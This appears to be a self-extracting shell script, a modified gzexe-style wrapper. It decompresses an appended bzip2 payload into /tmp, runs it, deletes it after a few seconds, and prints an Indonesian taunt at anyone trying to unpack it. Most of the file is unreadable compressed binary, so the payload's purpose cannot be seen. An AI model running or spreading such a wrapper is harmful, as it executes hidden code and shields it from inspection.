skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? $0; exit 1
fi; exit $res
BZh91AY&SY�9  �_�D����/n������@�m���`h�Oh��S�L�f�5d� f��O ��y2OI�bM�Q� �@4� d�1�P��4�0   2`�&$�i��Si=��OI��h�j�F� ��1����鎌K���x���O⎓!��qT)�3kw�{x U��,"+��}�t��r���f�(J�r��Tq�P;�Ң�n澦9,�ȞЌfղ�恀]Ҁ��	��j��e�:8�����w�a��J�e�oL�t�(p|�
���l#`��e��*��`�u�-9�.�^��� 2ez��&[@V�������-���~pD�K�MSP�V(�-Ti��\�I�%��#j:��=\���E&�ks��*�\	,|��v~6l�)���2#�eX:����gN(��=�#��Bft�X���mHҼ]\>j���&VP:P��T;iL2M@[u�Q�fb�C��8|��HY��$mOx�Ș�O�4�W%��k��pd+����Ŭq�$D6ª�]�?U��S6t�C��X2����
7/5�d������m���3g��P,8?�m3�0�w���P��)r��k��X~�-j]�֥
���d�#���L$ �D���G��+T��Y}�w���"���s�yYy=�҈�0���k�c.��;!�XOT�iV1>�k��+�0�������6V �C���Ī��N�@H{��P�5��'���|�X��R����H�?�ܑN$s��@